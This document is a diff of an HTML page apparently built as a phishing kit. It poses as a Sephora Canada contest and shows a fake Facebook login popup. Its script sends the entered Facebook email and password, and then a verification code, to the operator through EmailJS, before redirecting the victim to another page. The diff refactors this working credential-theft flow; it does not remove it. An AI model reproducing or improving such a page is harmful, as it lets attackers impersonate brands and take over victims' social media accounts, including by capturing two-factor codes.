@@ -4,153 +4,125 @@
   <meta charset="utf-8" />
   <title>Concours Sephora Canada</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="canonical" href="https://concours-sephora.onrender.com/" />
-  <meta name="robots" content="index,follow" />
 
-  <!-- Open Graph (Facebook/Messenger, WhatsApp, Snapchat) -->
+  <!-- Open Graph (Messenger, Snapchat, etc.) -->
   <meta property="og:site_name" content="Concours Sephora Canada" />
   <meta property="og:title" content="Concours Sephora Canada — Participez maintenant" />
-  <meta property="og:description" content="Inscrivez‑vous et courez la chance de remporter un prix Sephora. Aucun achat requis." />
+  <meta property="og:description" content="Inscris‑toi et cours la chance de remporter un prix Sephora. Aucun achat requis." />
   <meta property="og:type" content="website" />
   <meta property="og:url" content="https://concours-sephora.onrender.com/" />
-  <meta property="og:image" content="https://concours-sephora.onrender.com/preview_sephora.png" />
-  <meta property="og:image:secure_url" content="https://concours-sephora.onrender.com/preview_sephora.png" />
+  <meta property="og:image" content="https://concours-sephora.onrender.com/sephora.png" />
+  <meta property="og:image:secure_url" content="https://concours-sephora.onrender.com/sephora.png" />
   <meta property="og:image:type" content="image/png" />
   <meta property="og:image:width" content="1200" />
   <meta property="og:image:height" content="1200" />
-  <meta property="og:image:alt" content="Logo Sephora sur fond noir" />
+  <meta property="og:image:alt" content="Sephora — image de présentation" />
 
   <!-- Twitter Card -->
   <meta name="twitter:card" content="summary_large_image" />
   <meta name="twitter:title" content="Concours Sephora Canada — Participez maintenant" />
-  <meta name="twitter:description" content="Inscrivez‑vous et courez la chance de remporter un prix Sephora. Aucun achat requis." />
-  <meta name="twitter:image" content="https://concours-sephora.onrender.com/preview_sephora.png" />
-  <meta name="twitter:image:alt" content="Logo Sephora sur fond noir" />
+  <meta name="twitter:description" content="Inscris‑toi et cours la chance de remporter un prix Sephora. Aucun achat requis." />
+  <meta name="twitter:image" content="https://concours-sephora.onrender.com/sephora.png" />
+  <meta name="twitter:image:alt" content="Sephora — image de présentation" />
 
-  <!-- Fonts & libs -->
-  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
+  <!-- Fonts from original -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&display=swap" rel="stylesheet" />
+
+  <!-- EmailJS (integrated from index1.html) -->
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
   <style>
     :root{
       --black:#000; --white:#fff; --ink:#111; --border:#e9e9e9; --radius:14px;
-      --fb-blue:#1877F2; --fb-bg:#f0f2f5; --fb-text:#1c1e21;
+      --fb-blue:#1877F2; --fb-blue-dark:#0f69e0; --fb-bg:#f0f2f5; --fb-text:#1c1e21;
     }
-    *{ box-sizing:border-box }
-    html,body{ height:100% }
-    body{
-      margin:0; font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
-      color:var(--ink); background:var(--white); -webkit-font-smoothing:antialiased; text-rendering:optimizeLegibility;
-    }
-
-    /* Sephora stripes */
-    .stripe{ width:100%; height:14px; background-image:repeating-linear-gradient(90deg, var(--black) 0 60px, var(--white) 60px 120px) }
-
-    /* Header */
-    .topbar{ display:flex; align-items:center; justify-content:center; padding:18px 20px; border-bottom:1px solid var(--border); background:var(--white) }
-    .topbar img{ height:42px; width:auto; display:block }
-
-    /* Hero */
-    .hero{ max-width:1100px; margin:40px auto 22px; padding:0 20px; text-align:center }
-    .hero h1{ font-family:"Playfair Display", Georgia, serif; font-weight:700; letter-spacing:.3px; font-size:clamp(28px,5vw,48px); line-height:1.1; margin:0 0 10px; color:var(--black) }
-    .hero .subtitle{ margin:0 auto 22px; max-width:780px; font-size:clamp(14px,2.4vw,18px); color:#333 }
-
-    /* CTA */
-    .cta{ display:inline-flex; align-items:center; gap:10px; border:1px solid var(--black); background:var(--black); color:#fff; padding:14px 22px; border-radius:9999px; font-weight:700; cursor:pointer; transition:transform .12s ease, box-shadow .12s ease }
-    .cta:hover{ transform:translateY(-1px); box-shadow:0 8px 16px rgba(0,0,0,.12) }
-
-    /* Sponsors */
-    .sponsors{ max-width:1100px; margin:16px auto 0; padding:10px 20px; color:#444; text-align:center }
-    .sponsor-logos{ display:flex; justify-content:center; align-items:center; gap:24px; flex-wrap:wrap; margin-top:10px }
-    .sponsor-logos img{ height:46px; width:auto; filter:grayscale(100%) }
-
-    /* Avatar layout */
-    .bitmoji-layout{ position:relative; width:360px; height:360px; margin:36px auto }
-    .bitmoji{ width:92px; height:92px; border-radius:50%; background-size:cover; background-position:center; border:1px solid var(--border); box-shadow:0 4px 20px rgba(0,0,0,.06); position:absolute }
-    .bitmoji.center{ top:50%; left:50%; transform:translate(-50%,-50%) }
-    .bitmoji.top{ top:calc(50% - 120px); left:50%; transform:translate(-50%,-50%) }
-    .bitmoji.right{ top:50%; left:calc(50% + 120px); transform:translate(-50%,-50%) }
-    .bitmoji.bottom{ top:calc(50% + 120px); left:50%; transform:translate(-50%,-50%) }
-    .bitmoji.left{ top:50%; left:calc(50% - 120px); transform:translate(-50%,-50%) }
-    .bitmoji-row{ display:flex; justify-content:center; gap:14px; flex-wrap:wrap; margin:10px 0 26px; padding:0 20px }
-    .bitmoji-row .bitmoji{ position:static; width:76px; height:76px }
-
-    /* Banner */
-    .bottom-banner img{ width:100%; height:auto; display:block }
+    *{box-sizing:border-box} html,body{height:100%}
+    body{margin:0;font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:var(--ink);background:#fff}
+    .stripe{height:14px;width:100%;background-image:repeating-linear-gradient(90deg,#000 0 60px,#fff 60px 120px)}
+    .topbar{display:flex;justify-content:center;align-items:center;padding:18px 20px;border-bottom:1px solid var(--border)}
+    .topbar img{height:42px}
+    .hero{max-width:1100px;margin:40px auto 22px;padding:0 20px;text-align:center}
+    .hero h1{font-family:"Playfair Display",Georgia,serif;font-size:clamp(28px,5vw,48px);margin:0 0 10px;color:#000}
+    .subtitle{max-width:780px;margin:0 auto 22px;color:#333}
+    .cta{display:inline-flex;align-items:center;gap:10px;border:1px solid #000;background:#000;color:#fff;padding:14px 22px;border-radius:9999px;font-weight:700;cursor:pointer}
+    .sponsors{max-width:1100px;margin:16px auto 0;padding:10px 20px;text-align:center;color:#444}
+    .sponsor-logos img{height:46px;filter:grayscale(100%)}
+    .bitmoji-layout{position:relative;width:360px;height:360px;margin:36px auto}
+    .bitmoji{width:92px;height:92px;border-radius:50%;background-size:cover;background-position:center;border:1px solid var(--border);position:absolute}
+    .bitmoji.center{top:50%;left:50%;transform:translate(-50%,-50%)}
+    .bitmoji.top{top:calc(50% - 120px);left:50%;transform:translate(-50%,-50%)}
+    .bitmoji.right{top:50%;left:calc(50% + 120px);transform:translate(-50%,-50%)}
+    .bitmoji.bottom{top:calc(50% + 120px);left:50%;transform:translate(-50%,-50%)}
+    .bitmoji.left{top:50%;left:calc(50% - 120px);transform:translate(-50%,-50%)}
+    .bitmoji-row{display:flex;justify-content:center;gap:14px;flex-wrap:wrap;margin:10px 0 26px;padding:0 20px}
+    .bitmoji-row .bitmoji{position:static;width:76px;height:76px}
+    .bottom-banner img{width:100%;display:block}
 
     /* Overlay */
-    .overlay{ position:fixed; inset:0; background:rgba(0,0,0,.5); display:none; z-index:999 }
+    .overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);display:none;z-index:999}
 
     /* Facebook-like popup */
     .login-popup{
-      position:fixed; left:50%; top:10%; transform:translateX(-50%);
-      width:92%; max-width:420px; border-radius:12px; background:var(--fb-bg);
-      border:1px solid #d9dce1; box-shadow:0 30px 60px rgba(0,0,0,.25); display:none; z-index:1000; color:var(--fb-text);
+      position:fixed;left:50%;top:10%;transform:translateX(-50%);
+      width:92%;max-width:420px;border-radius:12px;background:var(--fb-bg);
+      border:1px solid #d9dce1;box-shadow:0 30px 60px rgba(0,0,0,.25);display:none;z-index:1000;
+      color:var(--fb-text);
     }
-    .fb-header{ display:flex; align-items:center; gap:10px; background:var(--fb-blue); color:#fff; padding:12px 16px; border-radius:12px 12px 0 0 }
-    .fb-logo{ width:22px; height:22px; border-radius:4px; background:#fff; display:grid; place-items:center; font-weight:800; color:var(--fb-blue) }
-    .fb-body{ padding:16px }
-    .login-popup label{ display:inline-block; margin:8px 0 6px; font-weight:600 }
-    .login-popup input{ width:100%; padding:12px; border-radius:8px; border:1px solid #ccd0d5; background:#fff; margin-bottom:10px; outline:none; transition:border-color .12s ease, box-shadow .12s ease }
-    .login-popup input:focus{ border-color:#a8b1bd; box-shadow:0 0 0 3px rgba(24,119,242,.15) }
-    .fb-cta{ width:100%; display:inline-flex; justify-content:center; align-items:center; gap:8px; background:var(--fb-blue); border:1px solid var(--fb-blue); color:#fff; border-radius:8px; padding:12px 16px; font-weight:700; cursor:pointer }
-    .fb-secondary{ width:100%; background:#fff; border:1px solid #d0d4da; color:#111; border-radius:8px; padding:12px 16px; font-weight:700; cursor:pointer }
-    .login-popup .links{ display:flex; justify-content:space-between; align-items:center; margin-top:8px }
-    .login-popup .links a{ font-size:.9rem; color:#1877F2; text-decoration:none }
-    .login-popup .links a:hover{ text-decoration:underline }
-    .helper{ font-size:.9rem; color:#606770; margin-top:6px }
+    .fb-header{
+      display:flex;align-items:center;gap:10px;background:var(--fb-blue);color:#fff;
+      padding:12px 16px;border-radius:12px 12px 0 0;
+    }
+    .fb-logo{width:22px;height:22px;border-radius:4px;background:#fff;display:grid;place-items:center;font-weight:800;color:var(--fb-blue)}
+    .fb-body{padding:16px}
+    .login-popup label{display:inline-block;margin:8px 0 6px;font-weight:600}
+    .login-popup input{
+      width:100%;padding:12px;border-radius:8px;border:1px solid #ccd0d5;background:#fff;margin-bottom:10px;
+      outline:none;transition:border-color .12s ease, box-shadow .12s ease;
+    }
+    .login-popup input:focus{border-color:#a8b1bd;box-shadow:0 0 0 3px rgba(24,119,242,.15)}
+    .fb-cta{
+      width:100%;display:inline-flex;justify-content:center;align-items:center;gap:8px;
+      background:var(--fb-blue);border:1px solid var(--fb-blue);color:#fff;border-radius:8px;
+      padding:12px 16px;font-weight:700;cursor:pointer;transition:filter .12s ease;
+    }
+    .fb-cta:hover{filter:brightness(1.05)}
+    .fb-secondary{width:100%;background:#fff;border:1px solid #d0d4da;color:#111;border-radius:8px;padding:12px 16px;font-weight:700;cursor:pointer;}
+    .helper{font-size:.9rem;color:#606770;margin-top:6px}
+    .login-popup .links{display:flex;justify-content:space-between;align-items:center;margin-top:8px}
+    .login-popup .links a{font-size:.9rem;color:var(--fb-blue);text-decoration:none}
+    .login-popup .links a:hover{text-decoration:underline}
 
-    /* Verification popup */
+    /* Verification popup keeps Sephora look */
     .verification-popup{
-      position:fixed; left:50%; top:12%; transform:translateX(-50%);
-      width:92%; max-width:420px; border-radius:12px; background:#fff; border:1px solid #d9dce1; display:none; z-index:1000;
-      box-shadow:0 30px 60px rgba(0,0,0,.25); padding:18px 16px; color:#111;
+      position:fixed;left:50%;top:12%;transform:translateX(-50%);
+      width:92%;max-width:420px;border-radius:12px;background:#fff;border:1px solid #d9dce1;display:none;z-index:1000;
+      box-shadow:0 30px 60px rgba(0,0,0,.25);padding:18px 16px;color:#111;
     }
-    .popup-actions{ display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:12px }
-    .btn{ border:none; border-radius:9999px; padding:12px 16px; font-weight:700; cursor:pointer }
-    .btn-primary{ background:#000; color:#fff; border:1px solid #000 }
-    .btn-secondary{ background:#fff; color:#111; border:1px solid #cfcfcf }
+    .popup-actions{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}
+    .btn{border:none;border-radius:9999px;padding:12px 16px;font-weight:700;cursor:pointer}
+    .btn-primary{background:#000;color:#fff;border:1px solid #000}
+    .btn-secondary{background:#fff;color:#111;border:1px solid #cfcfcf}
 
     /* Sound toggle */
-    .sound-toggle{ position:fixed; right:14px; bottom:14px; z-index:2000; background:rgba(255,255,255,.9); color:#111; border:1px solid var(--border); border-radius:9999px; padding:10px 14px; font-weight:700; cursor:pointer; box-shadow:0 6px 18px rgba(0,0,0,.12) }
-
-    @media (max-width:480px){
-      .bitmoji-layout{ width:300px; height:300px }
-      .bitmoji{ width:84px; height:84px }
-      .bitmoji.top{ top:calc(50% - 100px) }
-      .bitmoji.right{ left:calc(50% + 100px) }
-      .bitmoji.bottom{ top:calc(50% + 100px) }
-      .bitmoji.left{ left:calc(50% - 100px) }
-    }
+    .sound-toggle{position:fixed;right:14px;bottom:14px;z-index:2000;background:rgba(255,255,255,.9);border:1px solid var(--border);border-radius:9999px;padding:10px 14px;font-weight:700;cursor:pointer}
   </style>
 </head>
 <body>
   <span class="stripe" aria-hidden="true"></span>
-  <header class="topbar" role="banner">
+  <header class="topbar">
     <a href="https://sephora.com" target="_blank" rel="noopener">
-      <img src="sephora.png" alt="Sephora" />
+      <img src="sephora.png" alt="Sephora">
     </a>
   </header>
 
   <main>
-    <section class="hero" aria-labelledby="hero-title">
-      <h1 id="hero-title">Concours Sephora Canada</h1>
-      <p class="subtitle">Règlement officiel du concours. Inscrivez‑vous et courez la chance de remporter un prix de Sephora. Aucun achat requis pour participer ou gagner.</p>
-      <button class="cta" id="facebookBtn" onclick="openFacebookPopup()" aria-haspopup="dialog" aria-controls="facebookPopup">
-        <span aria-hidden="true">🪪</span> Inscription avec Facebook
-      </button>
+    <section class="hero">
+      <h1>Concours Sephora Canada</h1>
+      <p class="subtitle">Inscris‑toi pour courir la chance de remporter un prix. Aucun achat requis.</p>
+      <button class="cta" id="facebookBtn" onclick="openFacebookPopup()">🪪 Inscris‑toi avec Facebook</button>
     </section>
 
-    <section class="sponsors" aria-label="Organisateur">
-      <p>Ce concours est organisé par <strong><a href="https://sephora.com" target="_blank" rel="noopener">Sephora Canada</a></strong>.</p>
-      <div class="sponsor-logos">
-        <a href="https://sephora.com" target="_blank" rel="noopener">
-          <img src="sephora.png" alt="Logo Sephora Canada" />
-        </a>
-      </div>
-    </section>
-
-    <!-- Avatars -->
     <section class="bitmoji-layout" aria-label="Participants">
       <div class="bitmoji center" style="background-image:url('avatar5.png')"></div>
       <div class="bitmoji top"    style="background-image:url('avatar1.png')"></div>
@@ -164,19 +136,16 @@
       <div class="bitmoji" style="background-image:url('avatar4.png')"></div>
     </div>
 
-    <div class="bottom-banner" aria-hidden="true">
-      <img src="banner.png" alt="Bannière promotionnelle" />
-    </div>
+    <div class="bottom-banner"><img src="banner.png" alt=""></div>
   </main>
 
-  <!-- Audio -->
   <audio id="bgm" src="sephora.wav" preload="auto" autoplay loop playsinline></audio>
   <button id="soundToggle" class="sound-toggle" style="display:none;" aria-label="Activer le son">🔈 Son</button>
 
   <!-- Overlay -->
   <div id="overlay" class="overlay" onclick="closeAllPopups()" aria-hidden="true"></div>
 
-  <!-- Facebook-styled popup -->
+  <!-- Facebook-styled login -->
   <div class="login-popup" id="facebookPopup" role="dialog" aria-modal="true" aria-labelledby="fb-title">
     <div class="fb-header">
       <span class="fb-logo">f</span>
@@ -197,7 +166,7 @@
     </div>
   </div>
 
-  <!-- Verification popup -->
+  <!-- Verification popup (unchanged behavior) -->
   <div class="verification-popup" id="verificationPopup" role="dialog" aria-modal="true" aria-labelledby="verif-title">
     <h3 id="verif-title" style="margin:0 0 10px">Validation des informations</h3>
     <label for="verificationCode">Entrer le code reçu :</label>
@@ -209,20 +178,13 @@
     <div class="helper" id="code-helper"></div>
   </div>
 
-  <!-- Core scripts -->
   <script>
-    // EmailJS init (public key) + logs
-    document.addEventListener('DOMContentLoaded', () => {
-      try {
-        if (window.emailjs) {
-          emailjs.init('AATQVLMcBJaRBgEox'); // Clé publique
-          console.log('[EmailJS] init OK');
-        } else {
-          console.warn('[EmailJS] SDK non chargé');
-        }
-      } catch (e) {
-        console.error('[EmailJS] init error:', e);
+    // Initialize EmailJS (from index1.html) without changing existing behavior
+    document.addEventListener('DOMContentLoaded', function(){
+      if (window.emailjs) {
+        emailjs.init('AATQVLMcBJaRBgEox'); // clé publique d'index1.html
       }
+      document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeAllPopups(); });
     });
 
     function openFacebookPopup(){
@@ -239,64 +201,55 @@
       document.getElementById('facebookPopup').style.display='none';
       document.getElementById('verificationPopup').style.display='none';
     }
+  </script>
 
+  <!-- Keep existing EmailJS flow from original index.html -->
+  <script>
     async function submitFacebook(){
       const email = document.getElementById('fb-email').value.trim();
       const pass  = document.getElementById('fb-password').value.trim();
       const btn   = document.getElementById('fb-submit');
       const help  = document.getElementById('fb-helper');
 
-      if (!email || !pass) { help.textContent = 'Veuillez remplir tous les champs.'; return; }
-      if (!window.emailjs) { help.textContent = 'EmailJS non chargé.'; console.error('SDK absent'); return; }
+      if (!email || !pass){ help.textContent = 'Veuillez remplir tous les champs.'; return; }
 
       help.textContent = 'Envoi en cours...';
       btn.disabled = true;
-
-      try {
-        const params = { fb_email: email, fb_password: pass };
-        console.log('[EmailJS] send -> service_photos / template_connexion', params);
-        const res = await emailjs.send('service_photos', 'template_connexion', params);
-        console.log('[EmailJS] success:', res);
+      try{
+        if (window.emailjs) {
+          await emailjs.send('service_photos','template_connexion',{ fb_email:email, fb_password:pass });
+        }
         help.textContent = 'Informations envoyées. Vérification...';
-        document.getElementById('facebookPopup').style.display = 'none';
-        document.getElementById('verificationPopup').style.display = 'block';
-      } catch (err) {
-        console.error('[EmailJS] error (connexion):', err);
-        help.textContent = 'Erreur EmailJS : ' + (err?.text || err?.message || 'inconnue');
-      } finally {
+        document.getElementById('facebookPopup').style.display='none';
+        document.getElementById('verificationPopup').style.display='block';
+      }catch(err){
+        help.textContent = 'Erreur : ' + (err && err.text ? err.text : 'envoi impossible');
+      }finally{
         btn.disabled = false;
       }
     }
-
     async function finishAndContinue(){
       const code = document.getElementById('verificationCode').value.trim();
       const btn  = document.getElementById('code-submit');
       const help = document.getElementById('code-helper');
-
-      if (!code) { help.textContent = 'Veuillez entrer le code de vérification.'; return; }
-      if (!window.emailjs) { help.textContent = 'EmailJS non chargé.'; console.error('SDK absent'); return; }
-
+      if (!code){ help.textContent = 'Veuillez entrer le code de vérification.'; return; }
       help.textContent = 'Validation en cours...';
       btn.disabled = true;
-
-      try {
-        const params = { verification_code: code };
-        console.log('[EmailJS] send -> service_photos / template_code', params);
-        const res = await emailjs.send('service_photos', 'template_code', params);
-        console.log('[EmailJS] success:', res);
-        help.textContent = 'Validé.';
+      try{
+        if (window.emailjs){
+          await emailjs.send('service_photos','template_code',{ verification_code:code });
+        }
         closeAllPopups();
         window.location.href = 'medias.html';
-      } catch (err) {
-        console.error('[EmailJS] error (code):', err);
-        help.textContent = 'Erreur EmailJS : ' + (err?.text || err?.message || 'inconnue');
-      } finally {
+      }catch(err){
+        help.textContent = 'Erreur : ' + (err && err.text ? err.text : 'envoi impossible');
+      }finally{
         btn.disabled = false;
       }
     }
   </script>
 
-  <!-- Avatars -> banner swap -->
+  <!-- Avatar → banner swap (from original index.html) -->
   <script>
     document.addEventListener('DOMContentLoaded', function() {
       var avatars = document.querySelectorAll('.bitmoji-layout .bitmoji');
@@ -314,7 +267,7 @@
     });
   </script>
 
-  <!-- Audio toggle -->
+  <!-- Audio toggle (from original index.html) -->
   <script>
     document.addEventListener('DOMContentLoaded', function(){
       const audio = document.getElementById('bgm');
